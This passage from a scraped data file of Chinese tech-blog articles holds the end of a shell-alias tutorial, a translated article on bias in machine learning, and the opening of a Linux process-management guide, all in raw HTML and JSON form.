class=\"crayon-sy\">.</span><span class=\"crayon-o\">/</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-o\">/</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span>'</div><div class=\"crayon-line\" id=\"crayon-594b21ef37feb316997894-3\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0008 seconds] -->\r\n<p><code>type</code> 命令产生了一个易于人类理解的输出。</p>\n<p>另一个值得分享的是你可以将别名用于常见的输入错误。例如：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594b21ef37fee058953183\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nalias mroe='more'\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594b21ef37fee058953183-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b21ef37fee058953183-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594b21ef37fee058953183-1\"><span class=\"crayon-e\">alias </span><span class=\"crayon-v\">mroe</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">'more'</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b21ef37fee058953183-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p><em>最后，还值得注意的是并非每个人都喜欢使用别名。他们中的大部分人认为一旦你习惯了你为了简便而定义的别名，当你在其它相同而不存在别名（而且不允许你创建）的系统中工作时就会变得非常困难。更多（也是更准确的）为什么一些专家不推荐使用别名的原因，你到<a href=\"http://unix.stackexchange.com/questions/66934/why-is-aliasing-over-standard-commands-not-recommended\">这里</a>查看。</em></p>\n<h3 id=\"toc_3\">总结</h3>\n<p>就像我们之前文章讨论过的 <code>CDPATH</code> 环境变量，别名也是一把应该谨慎使用的双刃剑。尽管如此也别太丧气，因为每个东西都有它自己的好处和劣势。遇到类似别名的概念时，更多的练习和完备的知识才是重点。</p>\n<p>那么这就是该系列指南的最后章节。希望你喜欢它并能从中学到新的东西/概念。如果你有任何疑问或者问题，请在下面的评论框中和我们（以及其他人）分享。</p>\n<p>请使用手机”扫一扫”x</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"110848\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"110848votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"110848\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 1 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 1 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2015/04/e260ae4f5d153b25be87819b25ff0577.jpg"], "fav_nums": 1, "comment_nums": 1, "create_date": "2017/04/11", "praise_nums": 1}
{"tags": "IT技术", "front_image_path": "full/f8126bc9d551925f193df7b36fe58420631e3a82.jpg", "title": "机器是如何学会歧视的？机器学习中的偏见", "url_object_id": "fcd2fe182ded5d7a1921fe8212279623", "url": "http://blog.jobbole.com/111050/", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">本文由 <a href=\"http://blog.jobbole.com\">伯乐在线</a> - <a href=\"http://www.jobbole.com/members/maifansnet\">maifans</a> 翻译，<a href=\"http://www.jobbole.com/members/paradise_FD\">郑芸</a> 校稿。未经许可，禁止转载！<br>英文出处：<a target=\"_blank\" href=\"https://www.scientificamerican.com/article/how-a-machine-learns-prejudice/\">Jesse Emspak</a>。欢迎加入<a target=\"_blank\" href=\"http://group.jobbole.com/category/feedback/trans-team/\">翻译组</a>。</div><p>【导读】：数据的选用和人的主观想法往往会在机器学习中产生偏见，例如，用于训练的数据大多是白人而导致讲黑人的照片识别为猩猩，或是研究人员认为可以通过长相来识别这个人生是不是罪犯（然而被证实是完全错误的）。因此，选取合适的数据以及设计好的算法对于机器学习来说非常重要，否则只能是“垃圾进，垃圾出”。</p>\n<blockquote>\n<div align=\"left\">AI 是从人类创造者那里学到了偏见，与它那刻板，冰冷的逻辑无关</div>\n</blockquote>\n<p>倘若 AI 接管了我们的生活，不大会发生人类陷入与冷酷使用 Spock 式逻辑的机器人军队的战争中，因为 AI 已在肉体上奴役我们了。相反， AI 程序已经通过机器学习算法为我们推荐喜欢的电影、在照片上认出哪个朋友可能会拒绝给你借钱、把警察带到你邻居家，或者告诉医生你需要节食。既然人类创造了这些算法，它们就容易产生偏见，从而导致糟糕的决策和更糟糕的结果。</p>\n<p>补充：Spock  是《星际迷航》中的一个人物。如下图。</p>\n<p><img class=\"alignnone\" src=\"http://wx1.sinaimg.cn/mw690/63918611gy1ff7zteih3pj218g0xcjvv.jpg\" width=\"500\" height=\"375\"></p>\n<p>这些偏差也直接让人们对人工智能日益依赖的现状产生担忧。因为人类设计的绝对“中立”的 AI 系统仍可能固化人们的歧视，而不是识破它。例如，尽管程序本身没有明显的考虑种族因素，但<a href=\"https://www.propublica.org/article/machine-bias-risk-assessments-in-criminal-sentencing\">算法将黑人嫌犯标记为更有可能在将来犯罪</a>，而使用该软件的执法机构遭到了批评。</p>\n<p>主要问题发生在两个方面：</p>\n<ul>\n<li>一、用于校准机器学习算法的数据有时不足；</li>\n<li>二、算法本身设计很糟糕。机器学习是软件开发人员利用大量与任务相关的数据训练 AI 算法的过程。</li>\n</ul>\n<p>算法在初始提供的数据中获得模式，使其能在新的数据中识别类似的模式。但是它并不总是按我们认为的那样工作，而且有时结果很糟糕。例如，2015年6月， Google 的照片分类系统将两名非裔美国人识别为“大猩猩”。尽管谷歌很快解决了这个问题，但是微软 AI 研究员凯特·克劳福德在<a href=\"http://www.nytimes.com/2016/06/26/opinion/sunday/artificial-intelligences-white-guy-problem.html\">《纽约时报》</a>上表示这个错误反映了 AI 中更大的“白人问题”。也就是说，用于训练软件的数据太依赖于白人照片，降低了其准确识别具有不同容貌的人的照片的能力。</p>\n<p>2017 年 1 月，Facebook 的用户新闻推送被大量虚假新闻淹没，也凸显了 AI 的偏差问题。 Facebook 的热门新闻算法是根据参与度（用户的点击或分享频率）来确定新闻排序的 ，没有考虑到新闻的真实性。 2016 年 11月初，有新闻媒体透露，一群马其顿青年在美国大选期间<a href=\"https://www.buzzfeed.com/craigsilverman/how-macedonia-became-a-global-hub-for-pro-trump-misinfo\">愚弄了Facebook的“新闻推送”算法</a>，以推送吸引右派选民的虚假新闻。 Facebook 表示已经修改了算法，并宣布了帮助 <a href=\"http://www.snopes.com/\">Snopes</a> 、<a href=\"http://factcheck.org/\">Factcheck.org</a> 、<a href=\"http://abcnews.go.com/\">ABC News</a> 和 <a href=\"http://www.politifact.com/\">PolitiFact</a> 清除明显的虚假新闻的计划。</p>\n<p>马里兰大学计算机系副教授 Hal DauméIII 说：“这有点像「俄罗斯坦克问题」”。 这个典故产出自20世纪80年代，机器学习发展的早期。虽然它的真实性存在疑问，但它有一定的代表性，而且常常被计算机系的老师引用。这个故事说，美国军方试图训练一台电脑来区分俄罗斯和美国坦克的照片。 Daumé解释说：“它们的分类准确度非常高，但俄罗斯坦克的所有照片都模糊不清，而美国坦克是高清晰度的。” 该算法不是识别坦克，而是学习区分模糊和清晰的照片。</p>\n<p>尽管有这些已知的缺陷，研究人员最近开发了一种算法，可以通过面部识别技术来辨认罪犯。 中国上海交通大学研究人员吴晓琳（音译，以下简称吴）和张希（音译，以下简称张）使用了一个有 1856 张面部照片的数据库训练机器学习算法，其中 730 人是罪犯，另外 1126 人不是。 在分析了 90％ 的图片后，AI 能够正确地识别剩余 10％ 照片中的罪犯。</p>\n<p>该算法将具体的面部特征与罪犯相关联。例如罪犯的眼角、嘴唇曲率和鼻尖更有可能存在特定的空间关系。吴说，他也认同如果一个人有这些特征，不能说这个人更可能是罪犯。 吴同时发现罪犯的面孔差异较大，而非罪犯往往具有相似的面部特征。</p>\n<p>吴继续使用以前没有看过的不同的照片来测试算法，发现它多半情况下可以正确识别罪犯。研究人员试图通过只使用没有面部毛发和疤痕的中国青年或中年男子的面部图片进行训练和测试其算法来避免偏差。</p>\n<p>吴说：“我本来想证明面相学是错的”，他指的是基于面部特征评估性格的有数百年历史的伪科学。 “结果却令我们大吃一惊。”虽然这项研究似乎可以验证了面相学的某些方面，但吴承认，使用这种技术来识别罪犯将是“疯狂的”，没有计划在执法机关中应用。</p>\n<p>其他科学家说吴和张的发现可能会强化现有的偏见。 Google 机器学习领域的首席科学家 Blaise Agüera y Arcas 指出，司法系统决定受试者的犯罪行为，但它执行着人类有偏见的决策（或许是潜意识的）。论文的核心问题是它依赖这一系统“作为标记犯罪分子的依据，然后基于人类的判断得出结论：机器学习是无偏见的。” Agüera y Arcas 补充说。</p>\n<p>研究计算机视觉的华盛顿大学数学系助理教授 Kyle Wilson 如是说：「吴和他的同事“直接得出结论，他们发现了自然界的一个潜在的模式 —— 面部结构可以预示犯罪行为。这是一个非常愚蠢的结论。」他还表示，这个算法可能只是人类的偏见在一个特定的司法系统中的反映，并且在其他国家也可能有同样的问题。 Wilson 说：“基于偏见在刑事司法系统中的表现，相同的数据和工具可以用来更好地了解（人的）偏见。 而不是教一台电脑来重现这些人类的偏见。”</p>\n<p>还有人说，通过解释电脑学习的模式中的错误，可以改进技术来消除人的偏见。瑞士 AI 实验室 Dalle Molle 人工智能研究所的科学主任 Jürgen Schmidhuber 说，人工智能系统在学习时会犯错。事实上这是肯定的，所以称之为“学习”。他指出，电脑只会从你给出的数据中学习。“你不能消除所有这些偏见的来源，就像你不能消除人类中的偏见来源，”但他补充说，首先承认问题，然后确保使用好的数据，并把算法设计好；提出正确的问题至关重要，或者记住程序员的一句老话：“垃圾进，垃圾出（Garbage in, garbage out）”。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"111050\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"111050votetotal\">2</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"111050\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 1 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n<div id=\"author-bio\">\r\n\t\r\n\t<h3 class=\"widget-title\">\r\n\t关于作者：<a target=\"_blank\" href=\"http://www.jobbole.com/members/maifansnet\">maifans</a>\r\n\t</h3>\r\n\t<div class=\"alignleft\">\r\n\t\t<a target=\"_blank\" href=\"http://www.jobbole.com/members/maifansnet\">\r\n\t\t\t<img src=\"http://jbcdn2.b0.upaiyun.com/2015/04/8fbdaaa5ea6d3b49c8c1c825aafeb5d9.png\">\r\n\t\t</a>\r\n\t</div>\r\n\r\n    <div class=\"author-bio-info\">\r\n\r\n        <span class=\"author-bio-info-block\">\r\n            软件工程师，关注人工智能，关注医疗器械。        </span>\r\n        <span class=\"author-bio-info-block\">\r\n            <a href=\"http://www.jobbole.com/members/maifansnet\" target=\"_blank\"><i class=\"fa fa-user\"></i> 个人主页</a> ·\r\n            <a href=\"http://blog.jobbole.com/author/maifansnet/\" target=\"_blank\"><i class=\"fa fa-file-text-o\"></i> 我的文章</a>\r\n\r\n             · <a title=\"声望值\" target=\"_blank\" href=\"http://www.jobbole.com/members/maifansnet/reputation/\"><i class=\"fa fa-graduation-cap\"></i> 11</a>        </span>\r\n    </div>\r\n\t<div class=\"clear\"></div>\r\n</div>\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_url": ["http://wx1.sinaimg.cn/mw690/63918611gy1ff7zteih3pj218g0xcjvv.jpg"], "fav_nums": 1, "comment_nums": 0, "create_date": "2017/05/03", "praise_nums": 2}
{"tags": "进程,IT技术,Linux", "front_image_path": "full/14d81169d0e4f4af8986453f0fdd06356c67353a.jpg", "title": "关于 Linux 进程你所需要知道的一切", "url_object_id": "5ce17e71994d9e957f0c942e0e61ec47", "url": "http://blog.jobbole.com/111053/", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"http://www.tecmint.com/linux-process-management/\">Aaron Kili</a>   译文出处：<a target=\"_blank\" href=\"https://linux.cn/article-8451-1.html\">ictlyh</a>   </div><div> 在这篇指南中，我们会逐步对进程做基本的了解，然后简要看看如何用特定命令<a href=\"http://www.tecmint.com/dstat-monitor-linux-server-performance-process-memory-network/\">管理 Linux 进程</a>。</div>\n<p>进程process是指正在执行的程序；是程序正在运行的一个实例。它由程序指令，和从文件、其它程序中读取的数据或系统用户的输入组成。</p>\n<h3 id=\"toc_1\">进程的类型</h3>\n<p>在 Linux 中主要有两种类型的进程：</p>\n<ul>\n<li>前台进程（也称为交互式进程） – 这些进程由终端会话初始化和控制。换句话说，需要有一个连接到系统中的用户来启动这样的进程；它们不是作为系统功能/服务的一部分自动启动。</li>\n<li>后台进程（也称为非交互式/自动进程） – 这些进程没有连接到终端；它们不需要任何用户输入。</li>\n</ul>\n<h4 id=\"toc_2\">什么是守护进程daemon</h4>\n<p>这是后台进程的特殊类型，它们在系统启动时启动，并作为服务一直运行；它们不会死亡。它们自发地作为系统任务启动（作为服务运行）。但是，它们能被用户通过 init 进程控制。</p>\n<p><a href=\"http://www.tecmint.com/wp-content/uploads/2017/03/ProcessState.png\"><img class=\"aligncenter\" src=\"https://dn-linuxcn.qbox.me/data/attachment/album/201704/27/093035wd0ly8pppjc0fo8o.png\" alt=\"Linux 进程状态\"></a></p>\n<p><em>Linux 进程状态</em></p>\n<h3 id=\"toc_3\">在 Linux 中创建进程</h3>\n<p>（LCTT 译注：此节原文不确，根据译者理解重新提供）</p>\n<p>在 Linux 中创建进程有三种方式：</p>\n<h4 id=\"toc_4\">fork() 方式</h4>\n<p>使用 fork() 函数以父进程为蓝本复制一个进程，其 PID号与父进程 PID 号不同。在 Linux 环境下，fork() 是以写复制实现的，新的子进程的环境和父进程一样，只有内存与父进程不同，其他与父进程共享，只有在父进程或者子进程进行了修改后，才重新生成一份。</p>\n<h4 id=\"toc_5\">system() 方式</h4>\n<p>system() 函数会调用 <code>/bin/sh –c command</code> 来执行特定的命令，并且阻塞当前进程的执行，直到 command 命令执行完毕。新的子进程会有新的 PID。</p>\n<h4 id=\"toc_6\">exec() 方式</h4>\n<p>exec() 方式有若干种不同的函数，与之前的 fork() 和 system() 函数不同，exec() 方式会用新进程代替原有的进程，系统会从新的进程运行，新的进程的 PID 值会与原来的进程的 PID 值相同。</p>\n<h3 id=\"toc_7\">Linux 如何识别进程？</h3>\n<p>由于 Linux 是一个多用户系统，意味着不同的用户可以在系统上运行各种各样的程序，内核必须唯一标识程序运行的每个实例。</p>\n<p>程序由它的进程 ID（PID）和它父进程的进程 ID（PPID）识别，因此进程可以被分类为：</p>\n<ul>\n<li>父进程 – 这些是在运行时创建其它进程的进程。</li>\n<li>子进程 – 这些是在运行时由其它进程创建的进程。</li>\n</ul>\n<h4 id=\"toc_8\">init 进程</h4>\n<p>init 进程是系统中所有进程的父进程，它是<a href=\"http://www.tecmint.com/linux-boot-process/\">启动 Linux 系统</a>后第一个运行的程序；它管理着系统上的所有其它进程。它由内核自身启动，因此理论上说它没有父进程。</p>\n<p>init 进程的进程 ID 总是为 1。它是所有孤儿进程的收养父母。（它会收养所有孤儿进程）。</p>\n<h4 id=\"toc_9\">查找进程 ID</h4>\n<p>你可以用 pidof 命令查找某个进程的进程 ID：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bd57d14949398083600\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n# pidof systemd\r\n# pidof top\r\n# pidof httpd\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bd57d14949398083600-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd57d14949398083600-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594bd57d14949398083600-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd57d14949398083600-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bd57d14949398083600-1\"><span class=\"crayon-p\"># pidof systemd</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd57d14949398083600-2\"><span class=\"crayon-p\"># pidof top</span></div><div class=\"crayon-line\" id=\"crayon-594bd57d14949398083600-3\"><span class=\"crayon-p\"># pidof httpd</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd57d14949398083600-4\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p><img class=\"aligncenter\" src=\"https://dn-linuxcn.qbox.me/data/attachment/album/201704/27/093035lfx9l4zhhf6xelyx.png\" alt=\"查找 Linux 进程 ID\"></p>\n<p><em>查找 Linux 进程 ID</em></p>\n<p>要查找当前 shell 的进程 ID 以及它父进程的进程 ID，可以运行：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bd57d14959322188199\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ echo $$\r\n$ echo $PPID\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bd57d14959322188199-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd57d14959322188199-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594bd57d14959322188199-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bd57d14959322188199-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">echo</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">$</span><span class=\"crayon-sy\">$</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd57d14959322188199-2\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">echo</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">$</span><span class=\"crayon-i\">PPID</span></div><div class=\"crayon-line\" id=\"crayon-594bd57d14959322188199-3\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p><img class=\"aligncenter\" src=\"https://dn-linuxcn.qbox.me/data/attachment/album/201704/27/093035qz92snskbzi2d3ed.png\" alt=\"查找 Linux 父进程 ID\"></p>\n<p><em>查找 Linux 父进程 ID</em></p>\n<h3 id=\"toc_10\">在 Linux 中启动进程</h3>\n<p>每次你运行一个命令或程序（例如 cloudcmd – CloudCommander），它就会在系统中启动一个进程。你可以按照下面的方式启动一个前台（交互式）进程，它会被连接到终端，用户可以发送输入给它：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bd57d1495e850879976\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n# cloudcmd\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bd57d1495e850879976-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd57d1495e850879976-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bd57d1495e850879976-1\"><span class=\"crayon-p\"># cloudcmd</span></div><div class=\"crayon-line crayon-striped-line\" 